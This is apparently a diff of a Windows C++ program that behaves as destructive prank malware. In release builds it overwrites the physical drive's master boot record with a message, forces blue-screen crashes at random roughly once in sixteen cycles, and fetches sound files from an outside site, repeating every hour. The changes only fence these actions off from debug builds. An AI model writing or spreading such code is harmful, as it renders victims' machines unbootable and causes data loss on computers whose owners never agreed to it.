@@ -61,7 +61,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 	std::wstringstream wss;
 	std::wfstream wfs;
 	std::wstring arg;
-	std::vector<std::wstring> argv(c_argv + 1, c_argv + argc - 1);
+	std::vector<std::wstring> argv(c_argv, c_argv + argc - 1);
 	bool
 		cmd_c = false,
 		cmd_r = false,
@@ -81,6 +81,13 @@ int _tmain(int argc, TCHAR* c_argv[])
 	cmd__b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) != argv.end();
 	cmd__s = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-s"))) != argv.end();
 
+#ifndef NDEBUG
+	cmd_c = true;
+	cmd_r = true;
+	cmd_b = false;
+	cmd_m = false;
+	cmd_e = false;
+#endif
 	if (!cmd_c)
 		return 1;//不是内部调用
 
@@ -92,7 +99,9 @@ int _tmain(int argc, TCHAR* c_argv[])
 	{
 		char mbrmsg_s[512];
 		WideCharToMultiByte(CP_ACP, 0, (*(std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) + 1)).c_str(), -1, mbrmsg_s, 512, NULL, NULL);
+#ifdef NDEBUG
 		WritePhydriveMBR(0, mbrmsg_s);
+#endif
 	}
 	if (cmd_e)
 		return 0;
@@ -106,6 +115,7 @@ int _tmain(int argc, TCHAR* c_argv[])
 		iserror = !t_isok || iserror;
 		int lastbuildnumber = 0;
 		wss >> lastbuildnumber;
+/*
 		if (lastbuildnumber > __BUILD__)
 		{
 			//download update
@@ -119,17 +129,28 @@ int _tmain(int argc, TCHAR* c_argv[])
 			if (!wfs.good())
 				iserror = true;
 		}
+*/
 		//抽奖
 		if (rand() % 16 == 0 && !cmd__b)
-			iserror = MakeBlueScreen(0xC0000000+rand()%0xFFFFFF0) || iserror;
+		{
+#ifdef NDEBUG
+			iserror = MakeBlueScreen(0xC0000000 + rand() % 0xFFFFFF0) || iserror;
+#else
+			MessageBox(NULL, _T("Debug Info"), _T("Blue screen!"), MB_OK);
+			return 0;
+#endif
+		}
 		if (rand() % 16 == 0&&!cmd__s)
 		{
 			std::wstring soundid;
 			wss << rand() % 5 << std::flush;
 			wss >> soundid;
-			std::string sounddata;
-			sounddata = GetDataFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), iserror);
-			iserror = PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound") + soundid + _T(".wav"), true) || iserror || !t_isok;
+			std::wstring sounddata;
+			sounddata = GetWDataFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), iserror);
+			iserror = PlaySoundFile(sounddata.c_str(), true) || iserror || !t_isok;
+#ifdef DEBUG
+			MessageBox(NULL, _T("Debug Info"), (_T("sound") + soundid).c_str(), MB_OK);
+#endif
 		}
 		if (rand() % 16 == 0)
 		{
@@ -138,7 +159,12 @@ int _tmain(int argc, TCHAR* c_argv[])
 		}
 		if (iserror)
 			terminate();
+#ifdef NDEBUG
 		Sleep(60 * 60 * 1000);//wait 1h
+#else
+		;
+		Sleep(1300);
+#endif
 	}
 	return 0;
 }
